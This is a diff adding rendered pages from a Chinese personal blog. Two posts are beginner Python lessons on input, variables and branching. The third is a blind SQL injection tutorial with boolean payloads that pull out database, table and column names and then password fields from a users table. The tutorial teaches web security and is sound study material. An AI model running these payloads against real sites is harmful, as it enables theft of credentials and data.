@@ -66,6 +66,423 @@
     
     
     
+    <article id="post-Python语言学习（二）" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/03/26/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"
+    >Python语言学习（二）</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/03/26/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date">
+  <time datetime="2020-03-26T03:05:49.723Z" itemprop="datePublished">2020-03-26</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="程序的控制结构（分支结构）"><a href="#程序的控制结构（分支结构）" class="headerlink" title="程序的控制结构（分支结构）"></a>程序的控制结构（分支结构）</h1><p><img src="https://img-blog.csdnimg.cn/20200323142218959.png" alt="在这里插入图片描述"></p>
+<ol>
+<li>掌握顺序结构的使用。</li>
+<li>掌握分支条语句的使用。</li>
+<li>掌握分支嵌套语句的使用。<h2 id="典型程序例子"><a href="#典型程序例子" class="headerlink" title="典型程序例子"></a>典型程序例子</h2></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#企业发放的奖金根据利润提成。</span></span><br><span class="line"><span class="comment"># 利润(I)低于或等于10万元时，奖金可提10%</span></span><br><span class="line"><span class="comment"># 利润高于10万元，低于20万元时，低于10万元的部分按10%提成，高于10万元的部分，可提成7.5%；</span></span><br><span class="line"><span class="comment"># 20万到40万之间时，高于20万元的部分，可提成5%；</span></span><br><span class="line"><span class="comment"># 40万到60万之间时高于40万元的部分，可提成3%；</span></span><br><span class="line"><span class="comment"># 60万到100万之间时，高于60万元的部分，可提成1.5%，</span></span><br><span class="line"><span class="comment"># 高于100万元时，超过100万元的部分按1%提成，从键盘输入当月利润I，求应发放奖金总数？</span></span><br><span class="line">i=float(input(<span class="string">"当月利润为(单位元):"</span>))</span><br><span class="line"><span class="keyword">if</span> i&lt;=<span class="number">100000</span>:</span><br><span class="line">    x=i*<span class="number">0.1</span></span><br><span class="line">    print(<span class="string">"应发放的总奖金为:"</span>,x)</span><br><span class="line"><span class="keyword">elif</span> i&lt;=<span class="number">200000</span>:</span><br><span class="line">    x=<span class="number">100000</span>*<span class="number">0.1</span>+<span class="number">100000</span>*<span class="number">0.075</span></span><br><span class="line">    print(<span class="string">"应发放的总奖金为:"</span>, x)</span><br><span class="line"><span class="keyword">elif</span> i&lt;=<span class="number">400000</span>:</span><br><span class="line">    x=<span class="number">100000</span>*<span class="number">0.1</span>+<span class="number">100000</span>*<span class="number">0.075</span>+<span class="number">200000</span>*<span class="number">0.05</span></span><br><span class="line">    print(<span class="string">"应发放的总奖金为:"</span>, x)</span><br><span class="line"><span class="keyword">elif</span> i&lt;=<span class="number">600000</span>:</span><br><span class="line">    x=<span class="number">100000</span>*<span class="number">0.1</span>+<span class="number">100000</span>*<span class="number">0.075</span>+<span class="number">200000</span>*<span class="number">0.05</span>+<span class="number">200000</span>*<span class="number">0.03</span></span><br><span class="line">    print(<span class="string">"应发放的总奖金为:"</span>, x)</span><br><span class="line"><span class="keyword">elif</span> i&lt;=<span class="number">1000000</span>:</span><br><span class="line">    x=<span class="number">100000</span>*<span class="number">0.1</span>+<span class="number">100000</span>*<span class="number">0.075</span>+<span class="number">200000</span>*<span class="number">0.05</span>+<span class="number">200000</span>*<span class="number">0.03</span>+<span class="number">400000</span>*<span class="number">0.015</span></span><br><span class="line">    print(<span class="string">"应发放的总奖金为:"</span>, x)</span><br><span class="line"><span class="keyword">elif</span> i&gt;<span class="number">1000000</span>:</span><br><span class="line">    x=<span class="number">100000</span>*<span class="number">0.1</span>+<span class="number">100000</span>*<span class="number">0.075</span>+<span class="number">200000</span>*<span class="number">0.05</span>+<span class="number">200000</span>*<span class="number">0.03</span>+<span class="number">400000</span>*<span class="number">0.015</span>+(i<span class="number">-1000000</span>)*<span class="number">0.01</span></span><br><span class="line">    print(<span class="string">"应发放的总奖金为:"</span>, x)</span><br></pre></td></tr></table></figure>
+<p>这是我写的奖金提成程序，很有自豪感有木有。<br>让我们run起来：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Dell\AppData\Local\Programs\Python\Python37\python.exe <span class="string">"C:/Users/Dell/Desktop/Python实验报告/实验二/实验2 程序控制结构（分支结构）/任务五.py"</span></span><br><span class="line">当月利润为(单位元):<span class="number">777777</span></span><br><span class="line">应发放的总奖金为: <span class="number">39500.0</span></span><br><span class="line"></span><br><span class="line">Process finished <span class="keyword">with</span> exit code <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>冥冥之中自有7意（狗头）</p>
+<h2 id="我对分支结构的理解"><a href="#我对分支结构的理解" class="headerlink" title="我对分支结构的理解"></a>我对分支结构的理解</h2><p>其中的<strong>if</strong>是如果的意思，如果成立则执行冒号后面的程序，否则按顺序执行下一个<strong>elif</strong>，表示为另一个if，如果成立则执行，不成立继续依次执行下一个elif，最后得到我们想要的结果。</p>
+<h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><p>呢么在练习几个任务吧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">姓名=input(<span class="string">"姓名："</span>)</span><br><span class="line">成绩=int(input(<span class="string">"成绩："</span>))</span><br><span class="line"><span class="keyword">if</span> 成绩==<span class="number">100</span>:</span><br><span class="line">    print(<span class="string">"给你个兰博基尼"</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">90</span>&lt;=成绩&lt;<span class="number">100</span>:</span><br><span class="line">    print(<span class="string">"给你个法拉利"</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">80</span>&lt;=成绩&lt;<span class="number">90</span>:</span><br><span class="line">    print(<span class="string">"给你个宝马"</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">70</span>&lt;=成绩&lt;<span class="number">80</span>:</span><br><span class="line">    print(<span class="string">"给你个奥迪"</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">60</span>&lt;=成绩&lt;<span class="number">70</span>:</span><br><span class="line">    print(<span class="string">"给你个奥拓"</span>)</span><br><span class="line"><span class="keyword">elif</span> 成绩&lt;<span class="number">60</span>:</span><br><span class="line">    print(<span class="string">"给你个大嘴巴子"</span>)</span><br></pre></td></tr></table></figure>
+<p>run：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Dell\AppData\Local\Programs\Python\Python37\python.exe <span class="string">"C:/Users/Dell/Desktop/Python实验报告/实验二/实验2 程序控制结构（分支结构）/分支结构例子1.py"</span></span><br><span class="line">姓名：张*航</span><br><span class="line">成绩：<span class="number">59</span></span><br><span class="line">给你个大嘴巴子</span><br><span class="line"></span><br><span class="line">Process finished <span class="keyword">with</span> exit code <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#从键盘输入三个整数a、b和c，输出其中最大的数。请编写程序实现。</span></span><br><span class="line">a=int(input(<span class="string">"输入整数a："</span>))</span><br><span class="line">b=int(input(<span class="string">"输入整数b："</span>))</span><br><span class="line">c=int(input(<span class="string">"输入整数c："</span>))</span><br><span class="line"><span class="keyword">if</span> a&gt;b <span class="keyword">and</span> a&gt;c:</span><br><span class="line">    print(a)</span><br><span class="line"><span class="keyword">elif</span> b&gt;a <span class="keyword">and</span> b&gt;c:</span><br><span class="line">    print(b)</span><br><span class="line"><span class="keyword">elif</span> c&gt;b <span class="keyword">and</span> c&gt;a:</span><br><span class="line">    print(c)</span><br></pre></td></tr></table></figure>
+<p>run:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Dell\AppData\Local\Programs\Python\Python37\python.exe <span class="string">"C:/Users/Dell/Desktop/Python实验报告/实验二/实验2 程序控制结构（分支结构）/任务六.py"</span></span><br><span class="line">输入整数a：<span class="number">1</span></span><br><span class="line">输入整数b：<span class="number">2</span></span><br><span class="line">输入整数c：<span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line">Process finished <span class="keyword">with</span> exit code <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p><strong>小结：</strong><br>这个代码中的<strong>if</strong>条件不要写成<strong>a&gt;b&gt;c</strong><br>如果b=c则该条件不能成立，加入输入的a为2，b为1，c为1，则虽然a大于b也大于c但是该条件还是无法成立，需要特别注意。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#从键盘任意输入三条边长，</span></span><br><span class="line"><span class="comment"># 经过简单的计算后，判断三条边长能否构成三角形，</span></span><br><span class="line"><span class="comment"># 并确定是什么类型的三角形，</span></span><br><span class="line"><span class="comment"># 如（等边，等腰，直角三角形、一般三角形）。</span></span><br><span class="line">a=float(int(input(<span class="string">"边长a的值："</span>)))</span><br><span class="line">b=float(int(input(<span class="string">"边长b的值："</span>)))</span><br><span class="line">c=float(int(input(<span class="string">"边长c的值："</span>)))</span><br><span class="line"><span class="keyword">while</span> a+b&lt;c <span class="keyword">and</span> a+c&lt;b <span class="keyword">and</span> b+c&lt;a:</span><br><span class="line">    print(<span class="string">"无法构成三角形，请重新输入！"</span>)</span><br><span class="line">    a = float(int(input(<span class="string">"边长a的值："</span>)))</span><br><span class="line">    b = float(int(input(<span class="string">"边长b的值："</span>)))</span><br><span class="line">    c = float(int(input(<span class="string">"边长c的值："</span>)))</span><br><span class="line"><span class="keyword">if</span> (a**<span class="number">2</span>+b**<span class="number">2</span>)==c**<span class="number">2</span> <span class="keyword">or</span> (a**<span class="number">2</span>+c**<span class="number">2</span>)==b**<span class="number">2</span> <span class="keyword">or</span> (c**<span class="number">2</span>+b**<span class="number">2</span>)==a**<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"该三角形为直角三角形！"</span>)</span><br><span class="line"><span class="keyword">elif</span> a==b==c:</span><br><span class="line">    print(<span class="string">"该三角形为等边三角形！"</span>)</span><br><span class="line"><span class="keyword">elif</span> a==b <span class="keyword">or</span> a==c <span class="keyword">or</span> b==c:</span><br><span class="line">    print(<span class="string">"该三角形为等腰三角形！"</span>)</span><br><span class="line"><span class="keyword">elif</span> a!=b <span class="keyword">and</span> a!=c <span class="keyword">and</span> b!=c:</span><br><span class="line">    print(<span class="string">"该三角形为一般三角形！"</span>)</span><br></pre></td></tr></table></figure>
+<p>run:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Dell\AppData\Local\Programs\Python\Python37\python.exe <span class="string">"C:/Users/Dell/Desktop/Python实验报告/实验二/实验2 程序控制结构（分支结构）/任务七.py"</span></span><br><span class="line">边长a的值：<span class="number">3</span></span><br><span class="line">边长b的值：<span class="number">3</span></span><br><span class="line">边长c的值：<span class="number">3</span></span><br><span class="line">该三角形为等边三角形！</span><br><span class="line"></span><br><span class="line">Process finished <span class="keyword">with</span> exit code <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>小结：<br>里面有个while代表循环语句，是则执行while下面的语句，否则执行后面程序，同类型的还有for，基本用法一样，都代表循环。这个程序也写了些时间，因为在外面光线强，符号弄错，缺失，弄了半天才做出来，不容易啊！第二节就到这把！<br><img src="https://img-blog.csdnimg.cn/2020032316174681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://shenmotai.github.io/2020/03/26/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="ck89qfgrm0002msvxbmqq023n"
+        class="article-share-link">分享</a>
+        
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-Python语言学习（一）" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/03/26/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"
+    >Python语言学习（一）</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/03/26/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+  <time datetime="2020-03-26T03:05:45.495Z" itemprop="datePublished">2020-03-26</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="Python语言简介"><a href="#Python语言简介" class="headerlink" title="Python语言简介"></a>Python语言简介</h1><p><strong>Python是一种解释型脚本语言，可以应用于以下领域：</strong></p>
+<ul>
+<li>Web 和 Internet开发</li>
+<li>科学计算和统计</li>
+<li>人工智能</li>
+<li>教育</li>
+<li>桌面界面开发</li>
+<li>软件开发</li>
+<li>后端开发</li>
+<li>网络爬虫</li>
+</ul>
+<p><strong>我的理解：对于我的作用目前主要用于为了写脚本</strong><br>这个Python学习也是怪我，把它放在了草稿箱两个星期，我决定不能再颓废下去了，奥利给！</p>
+<h1 id="基础符号"><a href="#基础符号" class="headerlink" title="基础符号"></a>基础符号</h1><p>首先的明白赋值符号：<br>|a=b  |  把b赋值于a|<br>|–|–|<br>|a==b  |a与b相等  |<br>然后是字符串：<br>|” “|双引号中间为内容  |<br>|–|–|<br>（字符串只显示一般不会改变）<br>还有最关键的两个代码：<br>|input|输入  |<br>|–|–|<br>| print| 输出|</p>
+<h1 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h1><h2 id="在我这里遇到不懂的函数统统来这里寻找真爱"><a href="#在我这里遇到不懂的函数统统来这里寻找真爱" class="headerlink" title="在我这里遇到不懂的函数统统来这里寻找真爱"></a>在我这里遇到不懂的函数统统来这里寻找真爱</h2><p>（大部分<strong>作用</strong>来自<a href="https://www.runoob.com/python3/python3-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a>查询）<br>| 名称 |作用  |<br>|–|–|<br>|int|定义整数  |<br>|float  |将整数和字符串转换成浮点数  |<br>| len | 返回对象（字符、列表、元组等）长度或项目个数 |<br>|  while，for| 循环结构 |<br>|if,elif  |条件语句  |<br>|  |  |<br>|–|–|</p>
+<p>我们可以通过一组简单的程序来观摩一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">学号=input(<span class="string">"请输入你的学号："</span>)</span><br><span class="line">姓名=input(<span class="string">"请输入你的姓名："</span>)</span><br><span class="line">邮箱=input(<span class="string">"请输入你的邮箱:"</span>)</span><br><span class="line">年龄=input(<span class="string">"请输入你的年龄:"</span>)</span><br><span class="line">身高=input(<span class="string">"请输入你的身高:"</span>)</span><br><span class="line">print(学号)</span><br><span class="line">print(姓名)</span><br><span class="line">print(邮箱)</span><br><span class="line">print(年龄)</span><br><span class="line">print(身高)</span><br></pre></td></tr></table></figure>
+<p><strong>run:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">请输入你的学号：<span class="number">123456</span></span><br><span class="line">请输入你的姓名：李云龙</span><br><span class="line">请输入你的邮箱:<span class="number">2214172016</span>@qq.com</span><br><span class="line">请输入你的年龄:<span class="number">18</span></span><br><span class="line">请输入你的身高:<span class="number">180</span></span><br><span class="line"><span class="number">123456</span></span><br><span class="line">李云龙</span><br><span class="line"><span class="number">2214172016</span>@qq.com</span><br><span class="line"><span class="number">18</span></span><br><span class="line"><span class="number">180</span></span><br></pre></td></tr></table></figure>
+<p>是不是超级无聊，嗯？我当时就是这么想的，哈哈哈哈！</p>
+<h1 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h1><p>先来一段代码介绍：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=int(input(<span class="string">"输入整数a："</span>))</span><br><span class="line">b=int(input(<span class="string">"输入整数b："</span>))</span><br><span class="line">print(<span class="string">"结果的商为:%d,余数为：%d"</span>%(a/b,a%b))</span><br></pre></td></tr></table></figure>
+<p>其中我们发现双引号中有个 <strong>%d</strong>,表示变量的意思，<br>后面的 <strong>%()</strong>，括号里面的内容即与前面对应的 <strong>%d</strong>有关，<strong>a/b</strong>是商的变量，<strong>a%b</strong>是余数的变量。<br><strong>run：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入整数a：<span class="number">5</span></span><br><span class="line">输入整数b：<span class="number">3</span></span><br><span class="line">结果的商为:<span class="number">1</span>,余数为：<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>是不是开始觉得Python有意思起来了！睡会觉接着写~<br>be long to over~  我回来了!<br>午睡真舒服，起来学习通签个到接着写。（心理辅导课）<br>来看下面一段代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">姓名=input(<span class="string">"请输入你的姓名:"</span>)</span><br><span class="line">print(<span class="string">"您的姓名长度为：%d"</span>%(len(姓名)))</span><br></pre></td></tr></table></figure>
+<p>通过里面的len函数来得出括号里字符的长度<br><strong>run：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请输入你的姓名:李云龙</span><br><span class="line">您的姓名长度为：<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<h2 id="再多具两个例子进一步学习吧"><a href="#再多具两个例子进一步学习吧" class="headerlink" title="再多具两个例子进一步学习吧"></a>再多具两个例子进一步学习吧</h2><p>查询总分和平均分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">高数=float(input(<span class="string">"请输入你的高数成绩："</span>))</span><br><span class="line">英语=float(input(<span class="string">"请输入你的英语成绩："</span>))</span><br><span class="line">计算机应用技术=float(input(<span class="string">"请输入你的计算机应用技术成绩："</span>))</span><br><span class="line">网络基础=float(input(<span class="string">"请输入你的网络基础成绩："</span>))</span><br><span class="line">总分=(高数+英语+计算机应用技术+网络基础)</span><br><span class="line">平均分=(总分/<span class="number">4</span>)</span><br><span class="line">print(<span class="string">"你的总成绩为："</span>,总分,<span class="string">"平均成绩为："</span>,平均分)</span><br></pre></td></tr></table></figure>
+<p><strong>run：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请输入你的高数成绩：<span class="number">100</span></span><br><span class="line">请输入你的英语成绩：<span class="number">99</span></span><br><span class="line">请输入你的计算机应用技术成绩：<span class="number">100</span></span><br><span class="line">请输入你的网络基础成绩：<span class="number">100</span></span><br><span class="line">你的总成绩为： <span class="number">399.0</span> 平均成绩为： <span class="number">99.75</span></span><br></pre></td></tr></table></figure>
+<p>这时候肯定有人疑惑不了脸也就算了，为什么英语才99分，嘻嘻，别小看这1分之差，就算是我高数真的考100分，我的英语也不可能99分，太难了兄嘚！<br>输入自己的身高（米）和体重（千克）得到自己的BMI值（很有意思吧）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">身高=float(input(<span class="string">"请输入您的身高："</span>))</span><br><span class="line">体重=float(input(<span class="string">"请输入您的体重："</span>))</span><br><span class="line">BMI=(体重/身高**<span class="number">2</span>)</span><br><span class="line">print(<span class="string">"你的BMI值为:"</span>,BMI)</span><br></pre></td></tr></table></figure>
+<p><strong>run：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请输入您的身高：<span class="number">1.8</span></span><br><span class="line">请输入您的体重：<span class="number">60</span></span><br><span class="line">你的BMI值为: <span class="number">18.51851851851852</span></span><br></pre></td></tr></table></figure>
+<p>这就是我的真实值（狗头），还不错吧，惊险过线！<br>初级的Python就学到这里吧，期待下一次的更新、、、<br><img src="https://img-blog.csdnimg.cn/2020031815153616.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://shenmotai.github.io/2020/03/26/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ck89qfgrl0001msvxc1ytdjzb"
+        class="article-share-link">分享</a>
+        
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-SQL注入——盲注" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/03/26/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/"
+    >SQL注入——盲注</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/03/26/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%9B%B2%E6%B3%A8/" class="article-date">
+  <time datetime="2020-03-26T03:05:12.262Z" itemprop="datePublished">2020-03-26</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h1 id="盲注的原理"><a href="#盲注的原理" class="headerlink" title="盲注的原理"></a>盲注的原理</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>盲注是sql注入的一种，主要用于没有显示位的注入，页面像一个机器人一样不报错代表yes，没有任何显示代表no，我们可以根据yes和no来判断数据库的名字，表名，列明以及字段。</p>
+<h2 id="首先第一步还是判断闭合符"><a href="#首先第一步还是判断闭合符" class="headerlink" title="首先第一步还是判断闭合符"></a>首先第一步还是判断闭合符</h2><p>我们输入 <code>1&#39;</code> 后发现页面为空<br><img src="https://img-blog.csdnimg.cn/20200308203612731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们在<code>1&#39;</code>后面加上<code>--+</code>，发现页面恢复正常<br><img src="https://img-blog.csdnimg.cn/20200308212556999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="猜库名"><a href="#猜库名" class="headerlink" title="猜库名"></a>猜库名</h2><p>我们知道了闭合符号后，即可进行一些sql语句的注入猜得库名。<br>先通过 <code>1&#39; and (lenth(database())&gt;1)--+</code> 可以修改后面1的值来判断库名的长度。<br><img src="https://img-blog.csdnimg.cn/20200308214638519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjE0ODMyNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过一番尝试得出长度为8<br>通过ascii码猜解库名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' and (ascii(substr(database(),&#123;1&#125;,1))&gt;&#123;97&#125;)--+（中括号不带入代码）</span></span><br></pre></td></tr></table></figure>
+
+
+<p>通过改变第一个中括号中的1的值来按顺序判断库名的英文字母<br>通过改变后面中括号中97的值并用二分法来判断该位置下字母的ASCII码的值，从而得到该位置的英文字母，最后得出数据库的名字。</p>
+<h2 id="猜数据表名"><a href="#猜数据表名" class="headerlink" title="猜数据表名"></a>猜数据表名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1)))&gt;&#123;101&#125; --+（中括号不带入代码）</span></span><br></pre></td></tr></table></figure>
+<p>方法与猜库名基本一致，通过修改中括号中的内容进行判断。<br>值得注意的是有许多数据表通过修改limit中括号里的0来判断其他表名，从而找到我们需要查找的表名。</p>
+<h2 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' and (ascii(substr((select column_name from information_schema.columns where table_name='</span>&#123;users&#125;<span class="string">' limit &#123;0&#125;,1),&#123;1&#125;,1)))&gt;&#123;100&#125; --+（中括号不带入代码）</span></span><br></pre></td></tr></table></figure>
+<p>代码中的中括号又多了一个变量，那就是表名，users可以改变成我们想要查询的数据库，其他中括号里的变量用法和上面一致。</p>
+<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">' and (ascii(substr(( select &#123;password&#125; from &#123;users&#125; limit &#123;0&#125;,1),&#123;1&#125;,1)))&gt;&#123;1&#125;--+</span></span><br></pre></td></tr></table></figure>
